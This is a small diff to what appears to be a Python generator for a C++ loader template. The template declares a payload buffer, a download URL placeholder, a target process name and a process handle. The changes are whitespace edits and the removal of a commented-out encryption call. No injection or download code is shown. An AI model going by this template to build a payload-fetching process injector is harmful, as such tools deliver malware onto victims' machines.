@@ -28,9 +28,9 @@ using namespace std;
 
 int main()
 {{
-    PBYTE  pPayloadAddress;
+    PBYTE pPayloadAddress;
     DWORD pPayloadSize;
-    string Url  = "{Url}";
+    string Url = "{Url}";
     LPWSTR szProcessName = L"{ProcessName}";
     DWORD dwProcessID;
     HANDLE hProcess;
@@ -42,7 +42,6 @@ int main()
         return 0;
     }}
 
-    //Encrypt(pPayloadAddress, pPayloadSize, NULL, NULL);
     """)
 
     if Enumeration != "null":
